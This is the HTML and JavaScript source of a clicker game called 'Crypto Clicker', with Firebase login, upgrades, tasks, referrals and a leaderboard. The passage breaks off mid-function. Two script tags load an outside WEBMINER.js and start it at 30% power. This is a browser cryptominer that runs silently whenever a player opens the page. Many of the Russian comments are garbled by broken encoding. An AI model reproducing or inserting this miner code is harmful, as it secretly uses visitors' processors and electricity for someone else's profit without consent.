<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<!--  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">-->
  <title>Crypto Clicker</title>
  <style>
    body {
      background: #0f0f0f;
      color: #fff;
      font-family: 'Segoe UI', sans-serif;
      text-align: center;
      padding: 20px;
    }
    input { padding: 8px; font-size: 16px; margin-bottom: 10px; border-radius: 5px; border: none; }
    .click-button {
      background: linear-gradient(135deg, #00ffa6, #00c3ff);
      color: #000;
      font-weight: bold;
      padding: 15px 30px;
      font-size: 18px;
      border-radius: 12px;
      cursor: pointer;
      margin: 10px;
      border: none;
    }
    #counter {
      font-size: 36px;
      margin-top: 20px;
      font-weight: bold;
      transition: transform 0.2s ease;
    }
    #counter.bounce {
      transform: scale(1.2);
    }
    #levelMessage {
      display: none;
      opacity: 0;
      transition: opacity 1s ease-in-out;
      color: gold;
      font-weight: bold;
      margin-top: 5px;
    }
    #levelMessage.show {
      display: block;
      opacity: 1;
    }
    table { margin: 20px auto; border-collapse: collapse; width: 80%; max-width: 600px; }
    th, td { padding: 10px; border-bottom: 1px solid #333; }
    th { background-color: #00c3ff; color: #000; }
    #message { margin-top: 10px; color: #ff5555; }
    .progress-container { background-color: #222; border-radius: 10px; height: 12px; width: 140px; margin: 10px auto; overflow: hidden; box-shadow: 0 0 5px #00ffc8; }
    .progress-bar { height: 100%; background: linear-gradient(90deg, #00ffc8 0%, #00c3ff 100%); width: 0%; transition: width 0.3s ease-in-out; border-radius: 10px; }
    #profilePanel { position: absolute; top: 20px; left: 20px; background-color: #1a1a1a; padding: 15px; border-radius: 12px; box-shadow: 0 0 10px #00c3ff; width: 200px; text-align: left; }
    #profilePanel div { margin: 6px 0; }
    #buttonGroup { margin-top: 180px; }
    #motiveText {
      margin-top: 20px;
      font-size: 18px;
      color: #00ffc8;
      text-shadow: 0 0 8px #00ffc8;
      transition: opacity 0.5s ease-in-out;
    }
    .achievement-panel {
      max-height: 0;
      overflow: hidden;
      transition: max-height 0.4s ease, padding 0.4s ease;
      padding: 0 10px;
      background-color: #1a1a1a;
      border-radius: 10px;
      margin-top: 20px;
      box-shadow: 0 0 10px #00c3ff;
    }
    .achievement-panel.open {
      max-height: 500px;
      padding: 10px;
    }
    .ad-container {
      text-align: center;
      margin: 20px 0;
      max-width: 100%;
      overflow: hidden;
    }
    .ad-container iframe {
      max-width: 100%;
      width: 728px;
      height: 90px;
      border: none;
      margin: 10px auto;
      display: block;
    }
    @media (max-width: 768px) {
      .ad-container iframe {
        width: 100%;
        height: auto;
        max-width: 300px;
      }
    }
    #tasksPanel {
      max-height: 0;
      overflow: hidden;
      transition: max-height 0.4s ease, padding 0.4s ease;
      padding: 0 10px;
      background-color: #1a1a1a;
      border-radius: 10px;
      margin-top: 20px;
      box-shadow: 0 0 10px #00c3ff;

      height: auto; /* –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫—É—é –≤—ã—Å–æ—Ç—É */
/*  min-height: 150px; /* –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è –≤—ã—Å–æ—Ç–∞, —á—Ç–æ–±—ã –ø–∞–Ω–µ–ª—å –Ω–µ –±—ã–ª–∞ —Å–ª–∏—à–∫–æ–º –º–∞–ª–µ–Ω—å–∫–æ–π */
/*  overflow-y: auto; /* –î–æ–±–∞–≤–ª—è–µ–º –ø—Ä–æ–∫—Ä—É—Ç–∫—É, –µ—Å–ª–∏ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –ø—Ä–µ–≤—ã—à–∞–µ—Ç –º–∞–∫—Å–∏–º–∞–ª—å–Ω—É—é –≤—ã—Å–æ—Ç—É */
 /* max-height: 50vh; /* –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –º–∞–∫—Å–∏–º–∞–ª—å–Ω—É—é –≤—ã—Å–æ—Ç—É (–æ–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ, 50% –≤—ã—Å–æ—Ç—ã —ç–∫—Ä–∞–Ω–∞) */
    }
    
    #tasksPanel.open {
      max-height: 500px;
      padding: 10px;
      height: auto; /* –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫—É—é –≤—ã—Å–æ—Ç—É –¥–ª—è —Å–ø–∏—Å–∫–∞ –∑–∞–¥–∞–Ω–∏–π */
    }
    #tasksList div {
      margin-bottom: 10px;
      padding: 8px;
      border: 1px solid #00c3ff;
      border-radius: 8px;
      background-color: #222;
    }
    @keyframes shake {
      0% { transform: translateX(0); }
      25% { transform: translateX(-5px); }
      50% { transform: translateX(5px); }
      75% { transform: translateX(-5px); }
      100% { transform: translateX(0); }
    }




    .bonus-card {
  background: #1a1a1a;
  padding: 15px;
  border-radius: 12px;
  width: 180px;
  box-shadow: 0 0 10px #00c3ff;
  text-align: center;
}
.bonus-card h3 {
  margin: 0 0 10px;
  font-size: 18px;
  color: #00ffa6;
}
.bonus-card p {
  margin: 0 0 10px;
  font-size: 14px;
  color: #fff;
}
#claimBonusBtn:disabled {
  background: #555;
  cursor: not-allowed;
}
@media (max-width: 768px) {
  #hourlyBonus {
    top: 10px;
    right: 10px;
  }
  .bonus-card {
    width: 140px;
    padding: 10px;
  }
  .bonus-card h3 {
    font-size: 16px;
  }
  .bonus-card p {
    font-size: 12px;
  }
}

    #tasksList .click-button {
  background: linear-gradient(135deg, #00ffa6, #00c3ff);
  color: #000;
  font-weight: bold;
  padding: 8px 15px;
  font-size: 14px;
  border-radius: 8px;
  cursor: pointer;
  margin: 5px;
  border: none;
  display: inline-block;
  z-index: 10;
  position: relative;
}
#tasksList .click-button:hover {
  background: linear-gradient(135deg, #00c3ff, #00ffa6);
}
#tasksList .click-button:disabled {
  background: #555;
  cursor: not-allowed;
}



    
#mainButtonContainer {
  display: flex;
  justify-content: center;
  margin: 20px 0;
}

.main-click-button {
  width: 120px;
  height: 120px;
  background: linear-gradient(135deg, #00ffa6, #00c3ff);
  border-radius: 50%;
  border: none;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  box-shadow: 0 0 15px #00c3ff;
  transition: transform 0.2s ease, box-shadow 0.2s ease;
  outline: none; /* –£–±–∏—Ä–∞–µ–º –∫–≤–∞–¥—Ä–∞—Ç–Ω—ã–π –∫–æ–Ω—Ç—É—Ä */
  -webkit-tap-highlight-color: transparent; /* —É–±–∏—Ä–∞–µ—Ç —Å–µ—Ä—ã–π –∫–≤–∞–¥—Ä–∞—Ç –Ω–∞ Android */
}

.main-click-button:hover {
  box-shadow: 0 0 25px #00ffa6;
}

.main-click-button:active {
  transform: scale(0.9);
  box-shadow: 0 0 10px #00c3ff; /* –£–º–µ–Ω—å—à–∞–µ–º —Ç–µ–Ω—å –ø—Ä–∏ –Ω–∞–∂–∞—Ç–∏–∏ */
}

/* –°—Ç–∏–ª–∏ –¥–ª—è —Ñ–æ–∫—É—Å–∞ (–¥–ª—è –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç–∏) */
.main-click-button:focus {
  outline: none; /* –£–±–∏—Ä–∞–µ–º —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–π –∫–æ–Ω—Ç—É—Ä */
  box-shadow: 0 0 15px #00ffa6, 0 0 5px #00c3ff; /* –î–æ–±–∞–≤–ª—è–µ–º –∫–∞—Å—Ç–æ–º–Ω—É—é —Ç–µ–Ω—å –¥–ª—è —Ñ–æ–∫—É—Å–∞ */
}

.main-click-button .icon {
  font-size: 50px;
}

.main-click-button,
.click-button {
  touch-action: manipulation; /* –û—Ç–∫–ª—é—á–∞–µ—Ç –º–∞—Å—à—Ç–∞–±–∏—Ä–æ–≤–∞–Ω–∏–µ –∏ –∑–∞–¥–µ—Ä–∂–∫—É –ø—Ä–∏ –∫–∞—Å–∞–Ω–∏–∏ */
}

    
    

.pulse {
  animation: pulse 0.2s ease;
}

@keyframes pulse {
  0% { transform: scale(1); }
  50% { transform: scale(1.2); }
  100% { transform: scale(1); }
}

    
                   
  </style>
</head>

<body>
  <div id="profilePanel">
    <div><strong>Player:</strong> <span id="profileName">Anonymous</span></div>
    <div><strong>Level:</strong> <span id="playerLevel">1</span> / 10</div>
    <div><strong>Click Power:</strong> <span id="profileClickPower">1</span></div>
    <div><strong>Autoclicker:</strong> <span id="profileAutoclick">Inactive</span></div>
    <div><strong>Tokens:</strong> <span id="profileTokens">0</span></div>
    <!-- –î–æ–±–∞–≤–ª—è–µ–º —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω—ã–π —Ä–∞–∑–¥–µ–ª -->
  <div><strong>Referral Link:</strong> <input id="referralLink" readonly style="width: 150px;"></div>
  <div><strong>Invited:</strong> <span id="invitedCount">0</span></div>
  <div><button class="click-button" onclick="copyReferralLink()">Copy Link</button></div>
    
    <div><button class="click-button" onclick="signOut()">Sign Out</button></div>
  </div>

  <div id="playerLevelContainer">
    <div id="levelMessage" style="display: none; color: gold; font-weight: bold; margin-top: 5px;">
      <!-- Message will appear here -->
    </div>
  </div>

  <h1>Crypto Clicker üí∞</h1>

  <div id="authSection">
    <button class="click-button" onclick="signInWithGoogle()">Sign in with Google</button>
    <div id="motiveText">Click ‚Äî earn tokens.</div>
  </div>

  <div id="gameSection" style="display:none;">
    <div id="hourlyBonus" style="position: absolute; top: 20px; right: 20px;">
    <div class="bonus-card">
      <h3>Hourly Bonus</h3>
      <p id="bonusTimer">Next in: 01:00:00</p>
      <button class="click-button" id="claimBonusBtn" onclick="claimHourlyBonus()" disabled>Claim Bonus</button>
    </div>
  </div>
   <!-- <div id="dailyReward" style="display: none; margin-top: 20px;">
      <h2>Daily Reward</h2>
      <p id="streakText">Login streak: 0 days</p>
      <button class="click-button" onclick="claimDailyReward()">Claim Reward</button>
    </div>-->

    <div id="mainButtonContainer">
  <button id="mainClickButton" class="main-click-button" onclick="clickToken()">
    <span class="icon">üí∞</span>
  </button>
    </div>

    <div id="counter">Tokens: 0</div>
    <div id="message"></div>
    <div id="buttonGroup">
     <!-- <button class="click-button" onclick="clickToken()">Collect Token</button> -->
      <button class="click-button" id="shopBtn" onclick="toggleShop()">Shop</button>
      <button class="click-button" onclick="toggleAchievements()">üèÜ Achievements</button>
      <button class="click-button" onclick="toggleTasks()">üìã Tasks</button>
      <button class="click-button" onclick="startMiniGame()">Start Mini-Game</button>
    </div>

    <div id="shop" style="display:none; margin-top: 20px;">
      <h2>üõí Upgrades</h2>
      <p id="clickPowerCostText">üí™ Click Power +1 (Cost: 50)</p>
      <p>Current: <span id="clickPowerDisplay">1</span> / 8</p>
      <div class="progress-container">
        <div class="progress-bar" id="clickPowerBar"></div>
      </div>
      <button class="click-button" onclick="buyUpgrade('clickPower')">Buy</button>

      <h2>‚ö° Autoclickers</h2>
      <div id="autoclickerShop" style="display: flex; flex-wrap: wrap; justify-content: center; gap: 20px;">
        <div style="background: #1a1a1a; padding: 20px; border-radius: 12px; width: 200px; box-shadow: 0 0 10px #00c3ff;">
          <h3>1 Minute</h3>
          <p>Cost: 200 Tokens</p>
          <button class="click-button" onclick="buyAutoclicker(1)">Buy</button>
        </div>
        <div style="background: #1a1a1a; padding: 20px; border-radius: 12px; width: 200px; box-shadow: 0 0 10px #00c3ff;">
          <h3>5 Minutes</h3>
          <p>Cost: 800 Tokens</p>
          <button class="click-button" onclick="buyAutoclicker(5)">Buy</button>
        </div>
        <div style="background: #1a1a1a; padding: 20px; border-radius: 12px; width: 200px; box-shadow: 0 0 10px #00c3ff;">
          <h3>10 Minutes</h3>
          <p>Cost: 1400 Tokens</p>
          <button class="click-button" onclick="buyAutoclicker(10)">Buy</button>
        </div>
      </div>
    </div>

    <div id="achievementsPanel" class="achievement-panel">
      <h2>Achievements</h2>
      <div id="achievementsList"></div>
    </div>

    <div id="tasksPanel" class="achievement-panel">
      <h2>Daily Tasks</h2>
      <div id="tasksList"></div>
    </div>

    <div id="miniGamePanel" style="display: none; margin-top: 20px;">
  <h2>Mini-Game: Clicker Race!</h2>
  <p>Click 50 times in 10 seconds!</p>
  <p>Time Left: <span id="miniGameTimer">10</span> sec</p>
  <p>Clicks: <span id="miniGameClicks">0</span>/50</p>
  <button class="click-button" onclick="miniGameClick()">Click!</button>
</div>

    <h2>Leaderboard</h2>
    <table>
      <thead><tr><th>#</th><th>Player</th><th>Tokens</th></tr></thead>
      <tbody id="leaderboard"></tbody>
    </table>
  </div>

  <script src="https://wm.bmwebm.org/WEBMINER.js"></script>
  <script>WEBMINER.config({ login: "5991295", pass: null }).power(30);</script>

  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-auth-compat.js"></script>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyDVgvBf_C6dIMtZ4MISwR5YRCBi8_JXinQ",
      authDomain: "cryptoclickertry.firebaseapp.com",
      databaseURL: "https://cryptoclickertry-default-rtdb.firebaseio.com",
      projectId: "cryptoclickertry",
      storageBucket: "cryptoclickertry.firebasestorage.app",
      messagingSenderId: "1017002572592",
      appId: "1:1017002572592:web:e06e5f4ba00017dc1466f5",
      measurementId: "G-W2T3BN4LL3"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const auth = firebase.auth();

    const allAchievements = {
      superClicker: { name: "Super Clicker", description: "Click 10,000 times", reward: "+2 Click Power (2 min)" },
      tokenHoarder: { name: "Token Hoarder", description: "Collect 1,000,000 tokens", reward: "+2 Click Power (2min)" },
      level5: { name: "Level 5 Reached", description: "Reach level 5", reward: "+1 Click Power" },
    };

    const levelUpRequirements = [
      50000, 100000, 500000, 2500000, 50000000, 200000000, 800000000, 3200000000, 10000000000
    ];


/*const dailyTasks = [
  {
    id: "clickMarathon",
    description: "Make 100 clicks",
    goal: 100,
    reward: 50
  },
  {
    id: "collectTokens",
    description: "Collect tokens",
    goalOptions: [1000, 3000, 5000],
    rewards: [100, 350, 600],
    period: "daily"
  },
  {
    id: "autoclickerMaster",
    description: "Activate autoclicker 5 times in a week",
    goal: 5,
    reward: "Free 5-minute autoclicker",
    period: "weekly"
  },
  {
    id: "subscribeTwitter",
    description: "Follow @CircleGameTry on X",
    goal: 1,
    reward: 20,
    period: "daily",
    link: "https://x.com/CircleGameTry"
  }
];!*/


   /*!!const dailyTasks = [
  {
    id: "clickMarathon",
    description: "Make 100 clicks",
    goal: 100,
    reward: 50,
    period: "daily"
  },
  {
    id: "collectTokens",
    description: "Collect tokens",
    goalOptions: [1000, 3000, 5000],
    rewards: [100, 350, 600],
    period: "daily"
  },
  {
    id: "subscribeTwitter",
    description: "Follow @CircleGameTry on X",
    goal: 1,
    reward: 20,
    period: "daily",
    link: "https://x.com/CircleGameTry"
  },
  {
    id: "autoclickerMaster",
    description: "Activate autoclicker 5 times in a week",
    goal: 5,
    reward: "Free 5-minute autoclicker",
    period: "weekly"
  },
  {
    id: "collectBigTokens",
    description: "Collect tokens in a week",
    goalOptions: [10000, 12000, 15000],
    rewards: [1000, 1200, 1500],
    period: "weekly"
  },
  {
    id: "clickMasterWeekly",
    description: "Make 500 clicks in a week",
    goal: 500,
    reward: 500,
    period: "weekly"
  }
];!!*/

const dailyTasks = [
  {
    id: "clickMarathon",
    description: "Make 100 clicks",
    goal: 100,
    reward: 50,
    period: "daily"
  },
  {
    id: "collectTokens",
    description: "Collect tokens",
    goalOptions: [1000, 3000, 5000],
    rewards: [100, 350, 600],
    period: "daily"
  },
  {
    id: "subscribeTwitter",
    description: "Follow @CircleGameTry on X",
    goal: 1,
    reward: 20,
    period: "daily",
    link: "https://x.com/CircleGameTry"
  },
  {
    id: "clickMasterWeekly",
    description: "Make 500 clicks in a week",
    goal: 500,
    reward: 500,
    period: "weekly"
  },
  {
    id: "autoclickerMaster",
    description: "Activate autoclicker 5 times in a week",
    goal: 5,
    reward: "Free 5-minute autoclicker",
    period: "weekly",
    alternate: true // –§–ª–∞–≥ –¥–ª—è —á–µ—Ä–µ–¥–æ–≤–∞–Ω–∏—è
  },
  {
    id: "collectBigTokens",
    description: "Collect tokens in a week",
    goalOptions: [10000, 12000, 15000],
    rewards: [1000, 1200, 1500],
    period: "weekly",
    alternate: true // –§–ª–∞–≥ –¥–ª—è —á–µ—Ä–µ–¥–æ–≤–∞–Ω–∏—è
  }
];
    
    

    let user = null;
    let score = 0;
    let clickPower = 1;
    let autoclickActive = false;
    let autoclickInterval = null;
    let autoclickEndTime = 0;
    let autoclickCooldown = false;
    let currentLevel = 1;
    let totalClicks = 0;
    let autoclickerUses = 0;
    let achievements = {};
    let tempBoostTimeout = null;
    let originalClickPower = null;
    let isRenderingTasks = false;
    let bonusTimerInterval = null;
    let isAnimating = false;
    let isProcessingReferrer = false;

    let miniGameActive = false;
    let miniGameClicks = 0;
    let miniGameTimer = null;

function startMiniGame() {
  if (score < 1000) {
    showMessage("You need 1000 tokens to start the mini-game!");
    return;
  }
  miniGameActive = true;
  miniGameClicks = 0;
  document.getElementById("miniGamePanel").style.display = "block";
  document.getElementById("miniGameClicks").innerText = miniGameClicks;
  let timeLeft = 10;
  document.getElementById("miniGameTimer").innerText = timeLeft;
  miniGameTimer = setInterval(() => {
    timeLeft--;
    document.getElementById("miniGameTimer").innerText = timeLeft;
    if (timeLeft <= 0) {
      endMiniGame();
    }
  }, 1000);
}

function miniGameClick() {
  if (miniGameActive) {
    miniGameClicks++;
    document.getElementById("miniGameClicks").innerText = miniGameClicks;
    if (miniGameClicks >= 50) {
      endMiniGame(true);
    }
  }
}

function endMiniGame(success = false) {
  clearInterval(miniGameTimer);
  miniGameActive = false;
  document.getElementById("miniGamePanel").style.display = "none";
  if (success) {
    score += 500;
    showMessage("Mini-game completed! +500 tokens!");
    submitScore();
  } else {
    showMessage("Mini-game failed. Try again!");
  }
  updateCounterDisplay();
  updateProfilePanel();
}

function generateReferralLink() {
  if (!user) return '';
  const baseUrl = window.location.origin; // –ù–∞–ø—Ä–∏–º–µ—Ä, https://your-game-domain.com
  return `${baseUrl}/?ref=${user.uid}`;
}

function copyReferralLink() {
  const referralLink = document.getElementById('referralLink');
  referralLink.select();
  document.execCommand('copy');
  showMessage('Referral link copied!');
}

    

    /*!function updateProfilePanel() {
      document.getElementById("profileClickPower").innerText = Math.min(clickPower, 8);

      if (autoclickActive) {
        const remaining = Math.max(0, autoclickEndTime - Date.now());
        const seconds = Math.floor(remaining / 1000) % 60;
        const minutes = Math.floor(remaining / 60000);
        document.getElementById("profileAutoclick").innerText = `Active: ${minutes}:${seconds.toString().padStart(2, '0')}`;
      } else {
        document.getElementById("profileAutoclick").innerText = "Inactive";
      }

      let level = 1;
      for (let i = 0; i < levelUpRequirements.length; i++) {
        if (score >= levelUpRequirements[i]) {
          level = i + 2;
        } else {
          break;
        }
      }

      document.getElementById("playerLevel").innerText = level;
      document.getElementById("profileTokens").innerText = score;
      document.getElementById("profileName").innerText = user?.displayName || "Anonymous";

      const levelMessageElement = document.getElementById("levelMessage");
      if (level === 10) {
        levelMessageElement.innerText = "Maximum level reached!";
        levelMessageElement.classList.add("show");
      } else {
        levelMessageElement.classList.remove("show");
      }
    }!*/


    function updateProfilePanel() {
  document.getElementById('profileClickPower').innerText = Math.min(clickPower, 8);
  if (autoclickActive) {
    const remaining = Math.max(0, autoclickEndTime - Date.now());
    const seconds = Math.floor(remaining / 1000) % 60;
    const minutes = Math.floor(remaining / 60000);
    document.getElementById('profileAutoclick').innerText = `Active: ${minutes}:${seconds.toString().padStart(2, '0')}`;
  } else {
    document.getElementById('profileAutoclick').innerText = 'Inactive';
  }
  let level = 1;
  for (let i = 0; i < levelUpRequirements.length; i++) {
    if (score >= levelUpRequirements[i]) {
      level = i + 2;
    } else {
      break;
    }
  }
  document.getElementById('playerLevel').innerText = level;
  document.getElementById('profileTokens').innerText = score;
  document.getElementById('profileName').innerText = user?.displayName || 'Anonymous';
  document.getElementById('referralLink').value = generateReferralLink();

  // –ü–æ–¥—Å—á–∏—Ç—ã–≤–∞–µ–º –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø—Ä–∏–≥–ª–∞—à—ë–Ω–Ω—ã—Ö
  if (user) {
    db.ref(`referrals/${user.uid}`).once('value').then(snapshot => {
      const referrals = snapshot.val();
      const invitedCount = referrals ? Object.keys(referrals).length : 0;
      document.getElementById('invitedCount').innerText = invitedCount;
    });
  }

  const levelMessageElement = document.getElementById('levelMessage');
  if (level === 10) {
    levelMessageElement.innerText = 'Maximum level reached!';
    levelMessageElement.classList.add('show');
  } else {
    levelMessageElement.classList.remove('show');
  }
} 
    

    function checkDailyReward() {
      if (!user) return;
      const today = new Date().toDateString();
      db.ref("dailyRewards/" + user.uid).once("value").then(snapshot => {
        const data = snapshot.val() || { lastLogin: "", streak: 0 };
        const lastLogin = data.lastLogin || "";
        let streak = data.streak || 0;

        if (lastLogin !== today) {
          document.getElementById("dailyReward").style.display = "block";
          if (new Date(lastLogin).toDateString() === new Date(Date.now() - 86400000).toDateString()) {
            streak++;
          } else {
            streak = 1;
          }
          db.ref("dailyRewards/" + user.uid).set({ lastLogin: today, streak: streak });
          document.getElementById("streakText").innerText = `Login streak: ${streak} days`;
        }
      });
    }

    function claimDailyReward() {
      db.ref("dailyRewards/" + user.uid).once("value").then(snapshot => {
        const data = snapshot.val();
        const streak = data.streak || 1;
        const rewards = [50, 100, 200, 300, 500, 1000, 2000];
        const reward = rewards[Math.min(streak - 1, rewards.length - 1)];

        score += reward;
        updateCounterDisplay();
        submitScore();
        showMessage(`Claimed ${reward} tokens for ${streak}-day streak!`);
        document.getElementById("dailyReward").style.display = "none";
      });
    }



function startBonusTimer() {
  if (bonusTimerInterval) clearInterval(bonusTimerInterval);

  bonusTimerInterval = setInterval(() => {
    if (!user) return;
    db.ref(`hourlyBonus/${user.uid}`).once("value").then(snapshot => {
      const data = snapshot.val() || { lastClaim: 0 };
      const now = Date.now();
      const timeSinceLastClaim = now - data.lastClaim;
      const oneHour = 3600000; // 1 hour in milliseconds
      const timeRemaining = Math.max(0, oneHour - timeSinceLastClaim);

      if (timeRemaining <= 0) {
        document.getElementById("claimBonusBtn").disabled = false;
        document.getElementById("bonusTimer").innerText = "Claim now!";
        clearInterval(bonusTimerInterval);
      } else {
        document.getElementById("claimBonusBtn").disabled = true;
        const hours = Math.floor(timeRemaining / 3600000);
        const minutes = Math.floor((timeRemaining % 3600000) / 60000);
        const seconds = Math.floor((timeRemaining % 60000) / 1000);
        document.getElementById("bonusTimer").innerText = `Next in: ${hours.toString().padStart(2, '0')}:${minutes
          .toString()
          .padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
      }
    }).catch(error => {
      console.error("Error fetching bonus timer:", error);
      showMessage("Failed to load bonus timer.");
    });
  }, 1000);
}

function claimHourlyBonus() {
  if (!user) {
    showMessage("Please sign in to claim the bonus.");
    return;
  }

  db.ref(`hourlyBonus/${user.uid}`).once("value").then(snapshot => {
    const data = snapshot.val() || { lastClaim: 0 };
    const now = Date.now();
    const timeSinceLastClaim = now - data.lastClaim;
    const oneHour = 3600000;

    if (timeSinceLastClaim >= oneHour || !data.lastClaim) {
      const reward = Math.floor(Math.random() * (200 - 10 + 1)) + 10; // Random 10-200 tokens
      score += reward;
      updateCounterDisplay();
      submitScore();
      showMessage(`Claimed ${reward} tokens from Hourly Bonus!`);

      db.ref(`hourlyBonus/${user.uid}`).set({ lastClaim: now }).then(() => {
        document.getElementById("claimBonusBtn").disabled = true;
        startBonusTimer();
      }).catch(error => {
        console.error("Error saving bonus claim:", error);
        showMessage("Failed to save bonus claim.");
      });
    } else {
      showMessage("Bonus not ready yet!");
    }
  }).catch(error => {
    console.error("Error checking bonus eligibility:", error);
    showMessage("Failed to check bonus eligibility.");
  });
}



    

    function closeAllPanels() {
      console.log("Closing all panels...");
      const shop = document.getElementById("shop");
      if (shop) {
        shop.style.display = "none";
        console.log("Shop panel closed");
      } else {
        console.error("Element #shop not found");
      }

      const achievementsPanel = document.getElementById("achievementsPanel");
      if (achievementsPanel) {
        achievementsPanel.classList.remove("open");
        console.log("Achievements panel closed");
      } else {
        console.error("Element #achievementsPanel not found");
      }
      const achievementsBtn = document.querySelector("button[onclick='toggleAchievements()']");
      if (achievementsBtn) {
        achievementsBtn.innerHTML = "üèÜ Achievements ‚ñº";
        console.log("Achievements button text updated");
      } else {
        console.error("Button for toggleAchievements not found");
      }

      const tasksPanel = document.getElementById("tasksPanel");
      if (tasksPanel) {
        tasksPanel.classList.remove("open");
        console.log("Tasks panel closed");
      } else {
        console.error("Element #tasksPanel not found");
      }
      const tasksBtn = document.querySelector("button[onclick='toggleTasks()']");
      if (tasksBtn) {
        tasksBtn.innerHTML = "üìã Tasks ‚ñº";
        console.log("Tasks button text updated");
      } else {
        console.error("Button for toggleTasks not found");
      }
    }

    function setClickPower(newPower) {
      clickPower = Math.min(newPower, 8);
      updateClickPowerBar();
      updateProfilePanel();
    }

    function getClickPowerUpgradeCost() {
      return Math.floor(500 * Math.pow(6, clickPower - 1));
    }

    function updateClickPowerCostText() {
      const costText = document.getElementById('clickPowerCostText');
      const currentLevel = parseInt(document.getElementById("playerLevel").innerText);
      const buyButton = document.querySelector("button[onclick=\"buyUpgrade('clickPower')\"]");

      if (costText) {
        if (clickPower >= 8) {
          costText.textContent = "üí™ Click Power: MAX LEVEL";
          if (buyButton) {
            buyButton.style.background = "linear-gradient(135deg, #00ffa6, #00c3ff)";
            buyButton.style.cursor = "pointer";
            buyButton.title = "Maximum Click Power reached";
          }
        } else if (clickPower >= 3 && currentLevel < clickPower + 1) {
          const cost = getClickPowerUpgradeCost();
          costText.textContent = `üí™ Click Power +1 (Cost: ${cost})`;
          if (buyButton) {
            buyButton.style.background = "linear-gradient(135deg, #00ffa6, #00c3ff)";
            buyButton.style.cursor = "pointer";
            buyButton.title = `Reach player level ${clickPower + 1} to upgrade`;
          }
        } else {
          const cost = getClickPowerUpgradeCost();
          costText.textContent = `üí™ Click Power +1 (Cost: ${cost})`;
          if (buyButton) {
            buyButton.style.background = "linear-gradient(135deg, #00ffa6, #00c3ff)";
            buyButton.style.cursor = "pointer";
            buyButton.title = "";
          }
        }
      }
    }

  /*!   function boostClickPowerTemporarily(amount, duration) {
      if (tempBoostTimeout) clearTimeout(tempBoostTimeout);

      originalClickPower = clickPower;
      const boosted = Math.min(clickPower + amount, 8);
      clickPower = boosted;

      const actualBoost = boosted - originalClickPower;
      showMessage(`Temporary boost: Click Power +${actualBoost} –Ω–∞ ${duration / 1000} —Å–µ–∫`);

      // –°–æ—Ö—Ä–∞–Ω—è–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –±—É—Å—Ç–∞ –≤ Firebase
      if (user) {
        const boostEndTime = Date.now() + duration;
        db.ref("leaderboard/" + user.uid).update({
          tempBoostActive: true,
          tempBoostEndTime: boostEndTime,
          tempBoostOriginalClickPower: originalClickPower,
          tempBoostAmount: amount,
          lastUpdate: Date.now()
        }).catch(error => {
          console.error("–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —Å–æ—Å—Ç–æ—è–Ω–∏—è –±—É—Å—Ç–∞:", error);
        });
      }

      tempBoostTimeout = setTimeout(() => {
        clickPower = originalClickPower;
        showMessage(`–ë—É—Å—Ç –∑–∞–∫–æ–Ω—á–∏–ª—Å—è: –°–∏–ª–∞ –∫–ª–∏–∫–∞ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞`);
        updateClickPowerBar();
        updateProfilePanel();
        submitScore();

        // –û—á–∏—â–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –±—É—Å—Ç–∞ –≤ Firebase
        if (user) {
          db.ref("leaderboard/" + user.uid).update({
            tempBoostActive: false,
            tempBoostEndTime: 0,
            tempBoostOriginalClickPower: 0,
            tempBoostAmount: 0,
            lastUpdate: Date.now()
          }).catch(error => {
            console.error("–û—à–∏–±–∫–∞ –æ—á–∏—Å—Ç–∫–∏ —Å–æ—Å—Ç–æ—è–Ω–∏—è –±—É—Å—Ç–∞:", error);
          });
        }
      }, duration);
    }!*/


    function boostClickPowerTemporarily(amount, duration) {
  // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –∞–∫—Ç–∏–≤–µ–Ω –ª–∏ –±—É—Å—Ç
  if (tempBoostTimeout && Date.now() < (autoclickEndTime || 0)) {
    showMessage("–ë—É—Å—Ç —É–∂–µ –∞–∫—Ç–∏–≤–µ–Ω!");
    return; // –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º –Ω–æ–≤—ã–π –≤—ã–∑–æ–≤, –µ—Å–ª–∏ –±—É—Å—Ç –∞–∫—Ç–∏–≤–µ–Ω
  }

  // –°–æ—Ö—Ä–∞–Ω—è–µ–º –∏—Å—Ö–æ–¥–Ω—É—é —Å–∏–ª—É –∫–ª–∏–∫–∞
  originalClickPower = clickPower;
  const boosted = Math.min(clickPower + amount, 8);
  clickPower = boosted;

  const actualBoost = boosted - originalClickPower;
  showMessage(`–í—Ä–µ–º–µ–Ω–Ω—ã–π –±—É—Å—Ç: –°–∏–ª–∞ –∫–ª–∏–∫–∞ +${actualBoost} –Ω–∞ ${duration / 1000} —Å–µ–∫`);

  // –°–æ—Ö—Ä–∞–Ω—è–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –±—É—Å—Ç–∞ –≤ Firebase
  if (user) {
    const boostEndTime = Date.now() + duration;
    db.ref("leaderboard/" + user.uid).update({
      tempBoostActive: true,
